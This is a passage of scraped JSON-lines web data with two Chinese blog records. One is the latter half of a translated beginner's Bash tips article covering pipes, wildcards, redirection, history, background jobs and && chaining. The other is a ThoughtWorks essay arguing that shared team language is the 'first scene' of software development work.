哲学，每个程序都足够小，只做一件事并将之做到最好。例如，ls命令列出当前目录下的所有文件，grep命令搜索输入其中的指定检索项。</p>\n<p>你可以通过管道机制（|字符）把二者结合起来，在当前目录下搜索文件。以下给出的命令（在当前文件夹下）搜索关键字为“word”的文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63672e73067789827963\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nls | grep word</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63672e73067789827963-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63672e73067789827963-1\"><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">grep </span><span class=\"crayon-t\">word</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3>3.通配符</h3>\n<p>“*”（星号）字符是一种匹配任意长度字符的通配符。比如，你想删除当前文件夹下名为“really long file name”和“really very long file name”的两个文件，你可以运行以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63672e73074674247980\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nrm really*name</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63672e73074674247980-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63672e73074674247980-1\"><span class=\"crayon-e\">rm </span><span class=\"crayon-e \">really*</span><span class=\"crayon-v\">name</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>这条命令会删除所有以“really”开头以“name”结尾的文件。但是，如果你运行的是 rm * 这条命令，你将会删除文件夹下的所有文件。（译注：使用通配符时要小心，尤其是你的rm没有-f确认时！）</p>\n<h3>4.输出重定向</h3>\n<p>“&gt;”字符可以把一条命令的输出重定向到一个文件或另一条命令。比如，下面这行命令执行完 ls 后会列出当前文件夹下的所有文件，其结果不是在终端显示，而是输出到当前文件夹下一个名为“file1”的文件中去:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63672e73078919904974\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nls &gt; file1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63672e73078919904974-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63672e73078919904974-1\"><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3>5.历史记录</h3>\n<p>Bash 能记住你以前输入过的命令，上、下方向键可以逐行调出它们。使用 history 命令打印历史记录，以管道机制 grep 选择性地输出你想要的结果。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63672e7307c337730226\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n~\r\n. \r\n..</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63672e7307c337730226-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63672e7307c337730226-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a63672e7307c337730226-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63672e7307c337730226-1\"><span class=\"crayon-o\">~</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63672e7307c337730226-2\"><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a63672e7307c337730226-3\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>“~”，也叫做波浪符，用来表示当前用户的主目录。相比通过 cd /home/name 到达你的主目录，你可以输入 cd ~ 来达到相同效果。这点也可以在相关路径上使用：比如 cd ~/Desktop 能够到达当前用户的 Desktop 目录。</p>\n<p>同样，“.”代表当前目录，“..”代表当前目录的父目录。使用 cd .. 可以返回上一级目录。它们也可以用在相关路径上，举例说明：你当前处在 Desktop 文件夹下，通过 cd ../Documents 命令，你可以转到与 Desktop 共有同一父文件夹的 Documents 文件夹去。</p>\n<p>（译注：“-”代表前一个目录，cd – 可以返回到前一个工作目录。）</p>\n<h3>6.后台命令</h3>\n<p>Bash 默认情况下会在当前终端下执行你键入的每条命令。通常这样是没有问题的，但是如果你想要在启动某个应用后继续使用终端呢？通过输入 firefox 启动火狐浏览器，你的终端将被错误提示等各种信息输出占据，直到你关闭火狐浏览器为止。在 Bash 中你可以通过在命令结尾添加“&amp;”操作符来后台执行程序。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63672e73080289433020\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfirefox &amp;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63672e73080289433020-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63672e73080289433020-1\"><span class=\"crayon-v\">firefox</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h3>7.条件执行</h3>\n<p>Bash 也可以连续执行两条命令。 第二条命令仅在第一条命令成功执行后才会开始执行。如要如此，你可以通过键入“&amp;&amp;”，也就是两个“&amp;”字符进行分隔，在同一行输入两条命令。下面给出的命令会在等待 5 秒后运行 gnome-screenshot 工具:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63672e73083554829366\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsleep 5 &amp;&amp; gnome-screenshot</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63672e73083554829366-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63672e73083554829366-1\"><span class=\"crayon-i\">sleep</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">gnome</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">screenshot</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113127\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113127votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113127\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/d1b17b98748a74826464a08e6d30a4ee1b15b171.jpg"}
{"url_object_id": "6ff9807fcfd11f7bd4902c340a1ce2ff", "title": "软件开发工作的第一现场", "url": "http://blog.jobbole.com/113385/", "create_date": "2017/12/26", "front_img_url": ["http://insights.thoughtworks.cn/wp-content/uploads/2017/12/feeling-1024x683.jpg"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 1, "tags": "其他,软件开发", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><div>\n<p>我的同事王健最近写了一篇文章——<a href=\"http://insights.thoughtworks.cn/self-organizing-all-round-team/\">《从汽车贴膜看专业团队》</a>。看了之后感触良多，特别是文中提到的现场管理和全功能团队两点。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/feeling.jpg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/feeling-1024x683.jpg\" alt=\"\" width=\"700\" height=\"467\"></a></p>\n<p>我有一个观点，说到专业性，传统行业比我们IT行业要强得多。从这篇文章可以看出，不管是管理人员的现场管理能力，还是全功能团队中一线人员的全栈能力，传统行业都比我们要强一些。相信有人会有些不服，不管什么现场管理，全功能团队我们也在做呀。</p>\n<p>说的没有错，但是，在IT行业里还真不容易找到这么专业的一个团队。而在传统行业里，这种水平的一个团队已经越来越常见了。这是为什么呢？按说大家都是人，通常来讲，IT行业的人能力素质不是还高一点吗？在我们这个行业中，专业团队不是应该更常见吗？虽然我们不一定要比你强，但是也不会比你弱得这么明显啊。</p>\n<p>当然，一方面是由于我们这个行业的工作比较复杂，不容易做到全栈，但我觉得更重要的是，IT行业属于知识工作，知识工作者的现场非常不明显，极难做到现场管理。</p>\n<p>我们IT行业的管理者，不管是项目经理，产品经理，还是技术领导者，大家也基本都和团队坐在一起。但是坐在一起，并不意味着就能够真的在现场。</p>\n<p>我们看到在那个贴膜团队里，团队领导只需要看一眼，发现有气泡，就知道质量有问题。也就是说，在传统行业进行现场管理的时候，问题都是非常直观的，非常容易发现。在软件行业想做到一点就难的多，记得几年前我的同事熊节也曾经写过一篇文章，文章的核心洞见就是软件开发的现场在代码里。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/0-2.jpg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/0-2-1024x645.jpg\" alt=\"\" width=\"700\" height=\"441\"></a></p>\n<p>这个想法在ThoughtWorks有很多拥护者，公司里有很多人提出过类似的观点，于是我们的很多方法就是构建于这些类似的观点之上。</p>\n<p>然而，如果我们想要追求IT工作者开发效率的极限，这个洞见还不够极致。经过几年的工作，我发现，代码只是软件开发工作的第二现场，软件开发工作的第一现场，在语言里。</p>\n<p>这里说的语言，不是编程语言，也不是广义的人类语言，比如汉语、英语。指的是我们在从事软件开发工作中所使用的一系列术语和相关的一系列呈现方式和沟通工具。借用一个技术术语，我们所说的语言是一套仅供软件开发所有相关人员使用的、组合的DSL，DSL全称：Domain specific language，中文名叫做：领域特定语言。</p>\n<p>DSL就DSL，还组合的DSL，为什么要说的这么拗口呢？什么叫组合的DSL?我们知道在软件开发的过程当中，需要各种不同的角色参与。每个角色有自己特定的领域，泛泛的讲可以分为三类：我们把产品经理和设计人员所使用的领域特定语言叫做设计语言；把开发和测试使用的语言叫做技术语言；把业务人员、组织管理者使用的语言，叫做业务语言。</p>\n<p>所以我们使用的这套领域特定语言是把这三类语言组合在一起而形成的一套语言。这就意味着我们这套语言非常容易充满歧义，造成每个角色自说自话却难以被发现。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/hide.jpg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/hide-1024x683.jpg\" alt=\"\" width=\"700\" height=\"467\"></a></p>\n<p>软件工程里的核心观点是：一个问题被发现的越晚，修正的成本就越高。比代码更早的是沟通，比沟通更早的就是语言。我们用语言去描述沟通的错误，去描述代码中的错误，我们用什么来描述语言的错误呢？还是语言，这就使得整个工作困难重重，难以达成共识。所以我们更需要非常严肃的对待软件开发工作的第一现场。</p>\n<p>之前一些方法试图建立纯粹的统一语言，所有人都说一套语言，事实上这个方法已经被行业放弃了，我们要承认，各自不同的语言有些部分可以简单统一成一种表达以消除歧义，有些部分只能结合。也就是说相关人员要懂多门语言。这个现实是我们必须接受的，软件正在吞噬世界，语言只会越来越复杂。就像我们再努力消除污染，也不能幻想世界回到工业文明以前了。无论我们多么努力的去建立统一语言，也不可能形成一门简单的语言，只能是多门DSL的一个杂合体。</p>\n<p>不过由于历史的原因，在行业放弃的过程中，由于“反对预先设计”走的过了头，“不谈建模，不谈标准化”成了一种奇怪的政治正确，导致很多优秀的工具和方法被边缘化了。其实我们憎恨的只是预先设计造成的反馈速度变慢，只是在这个过程中连带上了憎恨预先设计时代的一些工具，这就有点上纲上线了。</p>\n<p>幸而最近几年，各种领域建模的设计方法又重新回归。最近大行其道的领域驱动设计，就是在很严肃的对待业务语言的设计和使用。而在前端领域，Design System试图解决前端开发和设计师之间的语言分歧问题。我个人在从事软件开发工程师的培养方面发现，很多传统的可视化工具，比如说UML。如果不以繁重的预先设计为目的，来使用这些工具，仅把它们用作提高沟通效率的工具，他们的威力是十分惊人的。</p>\n<p>以我本人的团队为例，我们使用ant design为基础，设计了design system。使得我们可以在三天之内得到一个可以点击的软件原型，并在此基础上，进行各利益相关方之间的需求交流和反馈。在交流的过程当中，我们也刻意的统一了语言，使得我们尽管是一个远程团队，但是在交流的时候，能够很清楚的知道我们在对信息架构在哪一层进行反馈。这不但使得业务方可以反馈技术方，其实技术方也在引导业务方。语言的影响是双向的。</p>\n<p>在技术领域里，我们也选择了隔离性更好的技术架构，使得MVP的代码不会变成我们演进道路上必须长期背负的负累。而之所以在一篇聊“语言”的文章里提技术架构，是因为我们认为真正的架构不是纸上的，也不是代码里的，而是每个团队成员心里的架构。实施一个架构必然也是要进行大量沟通，也需要统一语言。</p>\n<p>而在交流业务的时候，我们刻意的划分了各种不同的子领域，又在每个领域当中统一了名词。统一名词还是比较简单的，最难的是划分领域，我们为此投入了大量的工作，也犯了一些错误，但这些付出是值得的，这之后，我们的沟通变得非常流畅。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/communication.jpg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/communication-1024x695.jpg\" alt=\"\" width=\"700\" height=\"475\"></a></p>\n<p>具体的实践有机会再跟大家分享。在这里仅仅聊一下沟通顺畅带来的价值，沟通顺畅的威力并不仅仅表现在沟通的时候可以很顺畅的传递信息，最重要的是当有团队成员对信息理解出现错误的时候，可以很容易的发现和给予反馈。</p>\n<p>这个优势在IT行业至关重要。IT行业的人员流动率接近25%，这意味着每年我们团队中至少有1/4的新人加入。即便我们想尽方法让我们的团队保持稳定，随着敏捷和精益创业的相关思想慢慢成为我们的工作常识，每个项目存在的时间都不会太长，这使得IT团队经常性的重组，有时是团队被打散，有时是同一个系统从一个团队交给了另一个团队。如果缺乏一种有效的反馈机制，那么无论是人员流动还是组织重组，所造成的切换成本都是一个很大的。尽管这个切换成本无法消除，但是尽量减少切换成本是我们每个专业人员应该追求的，尤其是团队中的技术领导者。</p>\n<p>技术领导者重音在“领导”，而不在“技术”。尤其在Tech@Core的今天，技术就是业务。优秀的技术领导者更不能把自己变成一个救火队员，只是被动的响应，尽管救火队员常常因为很容易被人看到而获得一些关注和赞扬，但在中国的文化里，我们都知道还有更高一层的境界，这个境界存在于很多典故中，比如上医治未病，善战者无赫赫之功。同理，软件开发领域的技术领导者们也应该努力使大多数问题发生的基础消灭于无形，这就需要我们走出舒适区，深入到软件开发的第一现场，进行现场管理。</p>\n<div></div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113385\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113385votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113385\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style 